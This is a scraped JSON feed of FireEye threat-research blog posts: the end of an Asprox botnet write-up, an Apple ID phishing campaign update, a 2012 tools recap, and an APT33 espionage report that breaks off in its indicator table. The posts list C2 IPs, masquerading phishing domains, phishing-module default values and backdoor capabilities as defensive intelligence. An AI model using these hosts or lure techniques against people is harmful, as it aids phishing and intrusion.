<span>91.212.253.253</span></span> <span class=\"c09_td_value is-hidden-mml\">91.212.253.253</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span></span></span> <span class=\"c09_td_value is-hidden-mml\"></span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>91.228.77.15</span></span> <span class=\"c09_td_value is-hidden-mml\">91.228.77.15</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <b>Conclusion</b></p> \n<p>The data reveals that each of the Asprox botnet’s malicious email campaigns changes its method of luring victims and C2 domains, as well as the technical details on monthly intervals. And, with each new improvement, it becomes more difficult for traditional security methods to detect certain types of malware.</p> \n<p> <b>Acknowledgements</b>:</p> \n<p>Nart Villeneuve, Jessa dela Torre, and David Sancho. Asprox Reborn. Trend Micro. 2013. http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-asprox-reborn.pdf</p>","descriptionType":"html","publishedDate":"Mon, 16 Jun 2014 14:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig1.png","linkMd5":"4c29773a1e006cd723540c52f4255694","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn80@2020_1/2020/08/24/14-11-05-105_a934c4d9aabe25dd.webp","destWidth":900,"destHeight":494,"sourceBytes":197531,"destBytes":48474,"author":"Amanda Stewart","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig1.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn80@2020_1/2020/08/24/14-11-05-105_a934c4d9aabe25dd.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig2.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn38@2020_2/2020/08/24/14-11-08-836_f8cd19bf45f81f7d.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig3.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn37@2020_1/2020/08/24/14-11-13-031_6f3a5de239be2bd2.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig4.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn74@2020_2/2020/08/24/14-11-14-709_c394724716095ece.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig5.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn64@2020_1/2020/08/24/14-11-11-380_e0f720ac80d97973.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig6.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn84@2020_1/2020/08/24/14-11-16-425_14d53f368d74366e.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig7.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn1@2020_6/2020/08/24/14-11-15-980_d50519577463bc67.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig8.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn14@2020_4/2020/08/24/14-11-14-787_0144ea69166fb178.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig9.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn51@2020_6/2020/08/24/14-11-17-502_47be7a2850e5cc43.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig10.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn24@2020_4/2020/08/24/14-11-18-185_6fd996d6d76e1b44.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig11.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn9@2020_6/2020/08/24/14-11-19-084_351c268e292b9331.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig12.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn80@2020_3/2020/08/24/14-11-19-643_221fd26f725747d3.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig13.jpg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn16@2020_1/2020/08/24/14-11-18-026_69f4196107ca6a54.webp"},"publishedOrCreatedDate":1598278264214},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Rotten Apples: Resurgence","link":"http://www.fireeye.com/blog/threat-research/2016/10/rotten_apples_resur.html","description":"<p>In June 2016, we published a <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/06/rotten_apples_apple.html\" target=\"_blank\">blog about a phishing campaign</a> targeting the Apple IDs and passwords of Chinese Apple users that emerged in the first quarter of 2016 (referred to as the “Zycode” phishing campaign). At FireEye Labs we have an automated system designed to proactively detect newly registered malicious domains and this system had observed some phishing domains that were designed to appear as legitimate Apple domains. Most of the domains reported by this system were suspended in June 2016, which resulted in a loss of momentum for the Zycode phishing campaign. Throughout the second quarter of 2016, the Zycode phishing campaign was in hibernation.</p> \n<p>We recently observed a resurgence of the same phishing campaign when our systems detected roughly 90 phony Apple-like domains that were registered from July 2016 to September 2016. Once again, Chinese Apple users are being targeted for their Apple IDs and passwords using the same content reported on in our earlier blog. The majority of these domains are registered in the .com TLD by email accounts from qq[.]com, and the IPs of these domains point to mainland China, as seen in Figure 1.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Fig1.png\" /></p> \n<p> <span class=\"type-XS\">Figure 1: Google map showing the location of the hosted phishing domains</span></p> \n<h5>What has not Changed?<br /> </h5> \n<p>The attackers have not changed the content of the phishing sites. The obfuscated JavaScript used in the earlier version is once again being used here in this campaign. We have provided the details of JavaScript and screenshots of interaction with the website in our <a href=\"https://www.fireeye.com/blog/threat-research/2016/06/rotten_apples_apple.html\">earlier blog</a>.</p> \n<h5>What has Changed?</h5> \n<p>Apparently the domains and email addresses used in previous version of the campaign were effectively taken down. Now the attackers have moved to a new malicious infrastructure; new domains, IPs and email addresses are being used for this campaign. The new domain names for the campaign are listed in Table 1, while their IPs and registrant emails are reported in Table 2 and Table 3, respectively.</p> \n<h5> <b>Domains List</b></h5> \n<h5> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab1.png\" /></h5> \n<p> <span class=\"type-XS\">Table 1: Apple phishing domains serving the Zycode phishing kit.</span></p> \n<h5>Unique IP(s)<br /> </h5> \n<p>Table 2 shows the list of unique IPs, which are not the same as what was seen before.<br /> </p> \n<h1> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab2.png\" /></h1> \n<p> <span class=\"type-XS\">Table 2. IP addresses used by the domains.</span></p> \n<h5>Unique Email Addresses<br /> </h5> \n<p>The email addresses used to register these domains, showing no similarity with email addresses in the previous campaign, are shown in Table 3.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab3.png\" /></p> \n<p> <span class=\"type-XS\">Table 3. List of unique registrant emails.</span> <br /> </p> \n<h5>Unique Registrants<br /> </h5> \n<p>Table 4 shows the registrant names, which have no similarity with the previous registrant name information.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab4.png\" /></p> \n<p> <span class=\"type-XS\">Table 4. List of registrant names used by the phishing domains.</span> <br /> </p> \n<h5>How to Avoid Being a Victim</h5> \n<p>Apple provides information on phishing <a href=\"http://www.apple.com/legal/more-resources/phishing/\">here</a> and <a href=\"https://support.apple.com/en-us/HT204759\">here</a>, and on iCloud security <a href=\"https://support.apple.com/en-us/HT203126\">here</a>. There are simple ways for a user to be more secure against this and similar attacks. The following are a few tips:</p> \n<ul> \n <li>Enable <a href=\"https://support.apple.com/en-us/HT204915\">two-factor authentication for Apple ID</a>.</li> \n <li>Always check the address bar for the correct web address.</li> \n <li>Avoid clicking links in emails and SMS messages that supposedly direct to iCloud pages.</li> \n <li>Use our <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/email-security.html#content-par_grid_66_33_full_c718\" target=\"_blank\">FireEye EX appliance</a>, which provides effective detection for the Zycode phishing campaign.</li> \n</ul>","descriptionType":"html","publishedDate":"Thu, 20 Oct 2016 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Fig1.png","linkMd5":"71dead00e4b9f7e22cc8c5c7aec1d029","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn72@2020_1/2020/08/24/14-11-06-142_c66f3e86939efb04.webp","destWidth":973,"destHeight":482,"sourceBytes":296971,"destBytes":56310,"author":"Dr. Fahim Abbasi","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Fig1.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn72@2020_1/2020/08/24/14-11-06-142_c66f3e86939efb04.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab1.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn47@2020_5/2020/08/24/14-11-10-355_8aff45ea3840390a.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab2.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn3@2020_3/2020/08/24/14-11-08-800_13cccfbf7e087475.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab3.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn46@2020_3/2020/08/24/14-11-08-798_72f9d9a9182390e5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab4.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn15@2020_2/2020/08/24/14-11-09-105_f2f5bf087a11b2c2.webp"},"publishedOrCreatedDate":1598278264197},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"A Look Back at 2012: The Armory","link":"http://www.fireeye.com/blog/threat-research/2012/12/2012-armory.html","description":"<div class=\"c00 c00v1\"> \n <p>&nbsp;As we are mere hours away from celebrating 2013, we'd like to focus today on M-Unition's Armory channel. The Armory is the place to be if you want to be the first to find out about the latest releases, free tools and of course, our ever popular M-Trends report. The most popular posts in this category are listed below for your reading pleasure.</p> \n <p> <b> <a href=\"https://www.mandiant.com/blog/archives/3702\" target=\"_blank\">New Product Offering: Mandiant Cloud Alert</a></b></p> \n <p>This past year we made several product announcements, but this one was especially rewarding. When you deal with cybersecurity risks on a daily basis you need tools to help you see activity in real time. At MIRcon ™ 2012, we announced our newest product offering: Mandiant Cloud Alert™. Mandiant Cloud Alert is a powerful tool, enabling organizations to identify malicious communication, audit existing security measures, monitor how the organization is trending over time, and track incidents in their network.</p> \n <p> <b> <a href=\"https://www.mandiant.com/blog/unibody-memory-analysis-introducing-mac-memoryze/\">Unibody Memory Analysis - Introducing Memoryze™ for the Mac 1.0</a></b></p> \n <p> <a href=\"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html\" target=\"_blank\">Memoryze™ for the Mac 1.0</a>, which brings memory imaging and analysis to the Mac, joins a growing list of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware.html\" target=\"_blank\">freeware tools</a> Mandiant provided this past year.</p> \n <p>Memoryze for the Mac 1.0 brings many of the features of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\" target=\"_blank\">Memoryze</a>™ to the Apple Macintosh platform. This new tool enables acquisition of memory images via the command-line or a simple GUI. In addition, Memoryze for the Mac 1.0 can perform offline analysis against memory images or live analysis on a running system.</p> \n <p> <b> <a href=\"https://www.mandiant.com/blog/archives/2459\" target=\"_blank\">Leveraging the Application Compatibility Cache in Forensic Investigations</a></b></p> \n <p>Freeware tool, <a href=\"https://github.com/mandiant/ShimCacheParser\" target=\"_blank\">Shim Cache Parser™</a>, was developed in the course of our incident response investigations, according to Mandiant's Andrew Davis.</p> \n <p>During keyword searches of compromised systems, the Mandiant team discovered known malicious file names in the Windows Registry. Further research showed the cache data was generated by the Windows Application Compatibility Database. Along with these file names, other types of file metadata can be recovered such as file size, file last modified times, and last execution time, depending on the operating system version. This data can be very useful during an incident response. It helps identify which systems an attacker may have executed malware on and can also provide information about the time that it may have occurred.</p> \n <p>Shim Cache Parser is the proof-of-concept tool we developed to extract this useful forensic evidence. You can download it <a href=\"https://github.com/mandiant/ShimCacheParser\" target=\"_blank\">here</a>.</p> \n <p> <b> <a href=\"https://www.mandiant.com/blog/archives/2678\" target=\"_blank\">Mandiant Introduces Reverse-Proxy Open Source Tool</a></b></p> \n <p>Mandiant's Sean Cunningham and Mark Thomas discuss the availability of a highly efficient reverse HTTP(S) proxy called simply 'RProxy™'. Mandiant released RProxy as an open sources tool to encourage the general community to participate in its evolution. You can download the tool <a href=\"https://github.com/mandiant/RProxy\" target=\"_blank\">here</a>.</p> \n <p> <a href=\"https://www.mandiant.com/blog/archives/2326\" target=\"_blank\"><b>M-Trends: The One Threat Report You Need to Read</b></a></p> \n <p>Each year Mandiant takes a look back at engagements we've responded to and puts together trends that help you fight back against targeted threats. On March 6th, we released our latest M-Trends report, <a href=\"http://marketing.mandiant.com/mtrends2012-sm\" target=\"_blank\">An Evolving Threat</a>, which revealed key insights, statistics and case studies illustrating how the tools and tactics of targeted attackers, including the Advanced Persistent Threat (APT), have evolved over the last year. We're currently working on the 2013 edition of M-Trends and plan to release it at <a href=\"http://www.rsaconference.com/\" target=\"_blank\">RSA 2013</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 31 Dec 2012 21:06:34 +0000","feedId":1226,"bgimg":"","linkMd5":"03322e736e7a038545252967d98f0d77","bgimgJsdelivr":"","metaImg":"","author":"Helena Brito","publishedOrCreatedDate":1598278264210},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Insights into Iranian Cyber Espionage: APT33 Targets Aerospace and\nEnergy Sectors and has Ties to Destructive Malware","link":"http://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html","description":"<p>When discussing suspected Middle Eastern hacker groups with destructive capabilities, many automatically think of the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/11/fireeye_respondsto.html\">suspected Iranian group</a> that previously used SHAMOON – aka <a href=\"https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Trojan%3AWin32%2FWipMBR.B\">Disttrack</a> – to target organizations in the Persian Gulf. However, over the past few years, we have been tracking a separate, less widely known suspected Iranian group with potential destructive capabilities, whom we call APT33. Our analysis reveals that APT33 is a capable group that has carried out cyber espionage operations since at least 2013. We assess APT33 works at the behest of the Iranian government.</p> \n<p>Recent investigations by FireEye’s <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services.html\">Mandiant incident response</a> consultants combined with FireEye iSIGHT Threat Intelligence analysis have given us a more complete picture of APT33’s operations, capabilities, and potential motivations. This blog highlights some of our analysis. Our detailed report on <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence/threat-intelligence-subscriptions.html\">FireEye Threat Intelligence</a>&nbsp;contains a more thorough review of our supporting evidence and analysis. We will also be discussing this threat group further during our <a href=\"https://www.brighttalk.com/webcast/10703/275683?utm_source=FireEye_blog\">webinar</a> on Sept. 21 at 8 a.m. ET.</p> \n<h4>Targeting</h4> \n<p>APT33 has targeted organizations – spanning multiple industries – headquartered in the United States, Saudi Arabia and South Korea. APT33 has shown particular interest in organizations in the aviation sector involved in both military and commercial capacities, as well as organizations in the energy sector with ties to petrochemical production.</p> \n<p>From mid-2016 through early 2017, APT33 compromised a U.S. organization in the aerospace sector and targeted a business conglomerate located in Saudi Arabia with aviation holdings.</p> \n<p>During the same time period, APT33 also targeted a South Korean company involved in oil refining and petrochemicals. More recently, in May 2017, APT33 appeared to target a Saudi organization and a South Korean business conglomerate using a malicious file that attempted to entice victims with job vacancies for a Saudi Arabian petrochemical company.</p> \n<p>We assess the targeting of multiple companies with aviation-related partnerships to Saudi Arabia indicates that APT33 may possibly be looking to gain insights on Saudi Arabia’s military aviation capabilities to enhance Iran’s domestic aviation capabilities or to support Iran’s military and strategic decision making vis a vis Saudi Arabia.</p> \n<p>We believe the targeting of the Saudi organization may have been an attempt to gain insight into regional rivals, while the targeting of South Korean companies may be due to South Korea’s recent partnerships with Iran’s petrochemical industry as well as South Korea’s relationships with Saudi petrochemical companies. Iran has <a href=\"https://financialtribune.com/articles/energy/41665/call-for-restoring-past-petrochemical-status\">expressed interest</a> in&nbsp;growing their petrochemical industry and often posited this expansion in competition to Saudi petrochemical companies. APT33 may have targeted these organizations as a result of Iran’s desire to expand its own petrochemical production and improve its competitiveness within the region.&nbsp;</p> \n<p>The generalized targeting of organizations involved in energy and petrochemicals mirrors previously observed targeting by other suspected Iranian threat groups, indicating a common interest in the sectors across Iranian actors.</p> \n<p>Figure 1 shows the global scope of APT33 targeting.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig1.jpg\" /> <br /> <span class=\"type-XS\">Figure 1: Scope of APT33 Targeting</span></p> \n<h4>Spear Phishing</h4> \n<p>APT33 sent spear phishing emails to employees whose jobs related to the aviation industry. These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files. The .hta files contained job descriptions and links to legitimate job postings on popular employment websites that would be relevant to the targeted individuals.</p> \n<p>An example .hta file excerpt is provided in Figure 2. To the user, the file would appear as benign references to legitimate job postings; however, unbeknownst to the user, the .hta file also contained embedded code that automatically downloaded a custom APT33 backdoor.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig2.png\" /> <br /> <span class=\"type-XS\">Figure 2: Excerpt of an APT33 malicious .hta file</span></p> \n<p>We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016. Many of the phishing emails appeared legitimate – they referenced a specific job opportunity and salary, provided a link to the spoofed company’s employment website, and even included the spoofed company’s Equal Opportunity hiring statement. However, in a few cases, APT33 operators left in the default values of the shell’s phishing module. These appear to be mistakes, as minutes after sending the emails with the default values, APT33 sent emails to the same recipients with the default values removed.</p> \n<p>As shown in Figure 3, the “fake mail” phishing module in the ALFA Shell contains default values, including the sender email address (solevisible@gmail[.]com), subject line (“your site hacked by me”), and email body (“Hi Dear Admin”).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig3.png\" /> <br /> <span class=\"type-XS\">Figure 3: ALFA TEaM Shell v2-Fake Mail (Default)</span></p> \n<p>Figure 4 shows an example email containing the default values the shell.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig4.png\" /> <br /> <span class=\"type-XS\">Figure 4: Example Email Generated by the ALFA Shell with Default Values</span></p> \n<h4>Domain Masquerading</h4> \n<p>APT33 registered multiple domains that masquerade as Saudi Arabian aviation companies and Western organizations that together have partnerships to provide training, maintenance and support for Saudi’s military and commercial fleet. Based on observed targeting patterns, APT33 likely used these domains in spear phishing emails to target victim organizations. &nbsp; &nbsp;</p> \n<p>The following domains masquerade as these organizations: Boeing, Alsalam Aircraft Company, Northrop Grumman Aviation Arabia (NGAAKSA), and Vinnell Arabia.</p> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\" width=\"238\"> \n <tbody> \n  <tr> \n   <td width=\"238\" valign=\"top\"><p>boeing.servehttp[.]com</p> </td> \n  </tr> \n  <tr> \n   <td width=\"238\" valign=\"top\"><p>alsalam.ddns[.]net</p> </td> \n  </tr> \n  <tr> \n   <td width=\"238\" valign=\"top\"><p>ngaaksa.ddns[.]net</p> </td> \n  </tr> \n  <tr> \n   <td width=\"238\" valign=\"top\"><p>ngaaksa.sytes[.]net</p> </td> \n  </tr> \n  <tr> \n   <td width=\"238\" valign=\"top\"><p>vinnellarabia.myftp[.]org</p> </td> \n  </tr>\n </tbody>\n</table> \n<p>Boeing, Alsalam Aircraft company, and Saudia Aerospace Engineering Industries entered into a <a href=\"http://boeing.mediaroom.com/2015-08-26-Boeing-Saudia-Aerospace-Engineering-Industries-and-Alsalam-Aircraft-Company-to-Establish-Saudi-Rotorcraft-Support-Center-in-Saudi-Arabia\">joint venture</a> to create the Saudi Rotorcraft Support Center in Saudi Arabia in 2015 with the goal of servicing Saudi Arabia’s <a href=\"https://www.aerosociety.com/Assets/Docs/Publications/SpecialistPapers/Definition_of_a_Rotorcraft.pdf\">rotorcraft fleet</a> and building a self-sustaining workforce in the Saudi aerospace supply base.</p> \n<p>Alsalam Aircraft Company also offers military and commercial maintenance, technical support, and interior design and refurbishment services.</p> \n<p>Two of the domains appeared to mimic Northrop Grumman joint ventures. These <a href=\"http://www.northropgrumman.com/Capabilities/RotaryWingAviation/Pages/default.aspx\">joint ventures</a> – Vinnell Arabia and Northrop Grumman Aviation Arabia – provide aviation support in the Middle East, specifically in Saudi Arabia. Both Vinnell Arabia and Northrop Grumman Aviation Arabia have been involved in <a href=\"http://www.prnewswire.com/news-releases/northrop-grumman-forms-industry-leading-team-for-ministry-of-national-guard-aviation-support-contract-saudi-arabia-234754491.html\">contracts</a> to train Saudi Arabia’s Ministry of National Guard.</p> \n<h4>Identified Persona Linked to Iranian Government</h4> \n<p>We identified APT33 malware tied to an Iranian persona who may have been employed by the Iranian government to conduct cyber threat activity against its adversaries.</p> \n<p>We assess an actor using the handle “xman_1365_x” may have been involved in the development and potential use of APT33’s TURNEDUP backdoor due to the inclusion of the handle in the processing-debugging (PDB) paths of many of TURNEDUP samples. An example can be seen in Figure 5.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig6.png\" /> <br /> <span class=\"type-XS\">Figure 5: “xman_1365_x\" PDB String in TURNEDUP Sample</span></p> \n<p>Xman_1365_x was also a community manager in the Barnamenevis Iranian programming and software engineering forum, and registered accounts in the well-known Iranian Shabgard and Ashiyane forums, though we did not find evidence to suggest that this actor was ever a formal member of the Shabgard or Ashiyane hacktivist groups.</p> \n<p>Open source reporting links the “xman_1365_x” actor to the “Nasr Institute,” which is purported to be equivalent to Iran’s “cyber army” and controlled by the Iranian government. Separately, additional evidence ties the “Nasr Institute” to the 2011-2013 attacks on the financial industry, a series of denial of service attacks dubbed Operation Ababil. In March 2016, the U.S. Department of Justice unsealed an&nbsp;<a href=\"https://www.justice.gov/usao-sdny/file/835061/download\">indictment</a>&nbsp;that named two individuals allegedly hired by the Iranian government to build attack infrastructure and conduct distributed denial of service attacks in support of Operation Ababil. While the individuals and the activity described in indictment are different than what is discussed in this report, it provides some evidence that individuals associated with the “Nasr Institute” may have ties to the Iranian government.</p> \n<h4>Potential Ties to Destructive Capabilities and Comparisons with SHAMOON</h4> \n<p>One of the droppers used by APT33, which we refer to as DROPSHOT, has been linked to the wiper malware SHAPESHIFT. Open source research indicates SHAPESHIFT may have been used to target organizations in Saudi Arabia.</p> \n<p>Although we have only directly observed APT33 use DROPSHOT to deliver the TURNEDUP backdoor, we have identified multiple DROPSHOT samples in the wild that drop SHAPESHIFT. The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration. Both DROPSHOT and SHAPESHIFT contain Farsi language artifacts, which indicates they may have been developed by a Farsi language speaker (Farsi is the predominant and official language of Iran).</p> \n<p>While we have not directly observed APT33 use SHAPESHIFT or otherwise carry out destructive operations, APT33 is the only group that we have observed use the DROPSHOT dropper. It is possible that DROPSHOT may be shared amongst Iran-based threat groups, but we do not have any evidence that this is the case.</p> \n<p>In March 2017, Kasperksy released a report that compared DROPSHOT (which they call Stonedrill) with the most recent variant of SHAMOON (referred to as Shamoon 2.0). They stated that both wipers employ anti-emulation techniques and were used to target organizations in Saudi Arabia, but also mentioned several differences. For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment. Kaspersky also noted the difference in resource language sections: SHAMOON embeds Arabic-Yemen language resources while DROPSHOT embeds Farsi (Persian) language resources.</p> \n<p>We have also observed differences in both targeting and tactics, techniques and procedures (TTPs) associated with the group using SHAMOON and APT33. For example, we have observed SHAMOON being used to target government organizations in the Middle East, whereas APT33 has targeted several commercial organizations both in the Middle East and globally. APT33 has also utilized a wide range of custom and publicly available tools during their operations. In contrast, we have not observed the full lifecycle of operations associated with SHAMOON, in part due to the wiper removing artifacts of the earlier stages of the attack lifecycle.</p> \n<p>Regardless of whether DROPSHOT is exclusive to APT33, both the malware and the threat activity appear to be distinct from the group using SHAMOON. Therefore, we assess there may be multiple Iran-based threat groups capable of carrying out destructive operations.</p> \n<h4>Additional Ties Bolster Attribution to Iran</h4> \n<p>APT33’s targeting of organizations involved in aerospace and energy most closely aligns with nation-state interests, implying that the threat actor is most likely government sponsored. This coupled with the timing of operations – which coincides with Iranian working hours – and the use of multiple Iranian hacker tools and name servers bolsters our assessment that APT33 may have operated on behalf of the Iranian government.</p> \n<p>The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC). The time of the observed attacker activity coincides with <a href=\"https://www.timeanddate.com/time/zones/irdt\">Iran’s Daylight Time</a>, which is +0430 UTC.</p> \n<p>APT33 largely operated on days that correspond to Iran’s workweek, Saturday to Wednesday. This is evident by the lack of attacker activity on Thursday, as shown in Figure 6. Public sources report that Iran works a Saturday to Wednesday or Saturday to Thursday work week, with government offices <a href=\"https://financialtribune.com/articles/travel/59580/weekend-reform-proposal-rejected\">closed on Thursday</a> and some <a href=\"http://www.irdiplomacy.ir/en/page/1959937/Will+Iran+Change+Weekends+to+Friday+and+Saturday.html\">private businesses</a> operating on a half day schedule on Thursday.<sup>&nbsp;</sup>Many other Middle East countries have <a href=\"https://blogs.wsj.com/middleeast/2013/06/23/saudi-arabia-switches-its-weekend-pleasing-businesses\">elected</a> to have a Friday and Saturday weekend.<sup> </sup>Iran is one of few countries that subscribes to a Saturday to Wednesday workweek.</p> \n<p>APT33 leverages popular Iranian hacker tools and DNS servers used by other suspected Iranian threat groups. The publicly available backdoors and tools utilized by APT33 – including NANOCORE, NETWIRE, and ALFA Shell – are all available on Iranian hacking websites, associated with Iranian hackers, and used by other suspected Iranian threat groups. While not conclusive by itself, the use of publicly available Iranian hacking tools and popular Iranian hosting companies may be a result of APT33’s familiarity with them and lends support to the assessment that APT33 may be based in Iran.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig7.png\" /> <br /> <span class=\"type-XS\">Figure 6: APT33 Interactive Commands by Day of Week</span></p> \n<h4>Outlook and Implications</h4> \n<p>Based on observed targeting, we believe APT33 engages in strategic espionage by targeting geographically diverse organizations across multiple industries. Specifically, the targeting of organizations in the aerospace and energy sectors indicates that the threat group is likely in search of strategic intelligence capable of benefitting a government or military sponsor. APT33’s focus on aviation may indicate the group’s desire to gain insight into regional military aviation capabilities to enhance Iran’s aviation capabilities or to support Iran’s military and strategic decision making. Their targeting of multiple holding companies and organizations in the energy sectors align with Iranian national priorities for growth, especially as it relates to increasing petrochemical production. We expect APT33 activity will continue to cover a broad scope of targeted entities, and may spread into other regions and sectors as Iranian interests dictate.</p> \n<p>APT33’s use of multiple custom backdoors suggests that they have access to some of their own development resources, with which they can support their operations, while also making use of publicly available tools. The ties to SHAPESHIFT may suggest that APT33 engages in destructive operations or that they share tools or a developer with another Iran-based threat group that conducts destructive operations.</p> \n<h4>Appendix</h4> \n<h5>Malware Family Descriptions</h5> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" width=\"472\"> \n <tbody> \n  <tr> \n   <td width=\"77\"><p>Malware Family</p> </td> \n   <td width=\"331\"><p>Description</p> </td> \n   <td width=\"64\" valign=\"bottom\"><p>Availability</p> </td> \n  </tr> \n  <tr> \n   <td width=\"77\"><p>DROPSHOT</p> </td> \n   <td width=\"331\"><p>Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware</p> </td> \n   <td width=\"64\"><p>Non-Public</p> </td> \n  </tr> \n  <tr> \n   <td width=\"77\"><p>NANOCORE</p> </td> \n   <td width=\"331\"><p>Publicly available remote access Trojan (RAT) available for purchase. It is a full-featured backdoor with a plugin framework</p> </td> \n   <td width=\"64\" valign=\"bottom\"><p>Public</p> </td> \n  </tr> \n  <tr> \n   <td width=\"77\"><p>NETWIRE</p> </td> \n   <td width=\"331\"><p>Backdoor that attempts to steal credentials from the local machine from a variety of sources and supports other standard backdoor features.</p> </td> \n   <td width=\"64\" valign=\"bottom\"><p>Public</p> </td> \n  </tr> \n  <tr> \n   <td width=\"77\"><p>TURNEDUP</p> </td> \n   <td width=\"331\"><p>Backdoor capable of uploading and downloading files, creating a reverse shell, taking screenshots, and gathering system information</p> </td> \n   <td width=\"64\"><p>Non-Public</p> </td> \n  </tr>\n </tbody>\n</table> \n<h5>Indicators of Compromise</h5> \n<p>APT33 Domains Likely Used in Initial Targeting</p> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\" width=\"221\"> \n <tbody> \n  <tr> \n   <td width=\"221\" valign=\"top\"><p>Domain</p> </td> \n  </tr> \n  <tr> \n   <td width=\"221\" valign=\"top\"><p>boeing.servehttp[.]com</p> </td> \n  </tr> \n  <tr> \n   <td width=\"221\" valign=\"top\"><p>alsalam.ddns[.]net</p> </td> \n  </tr> \n  <tr> \n   <td width=\"221\" valign=\"top\"><p>ngaaksa.ddns[.]net</p> </td> \n  </tr> \n  <tr> 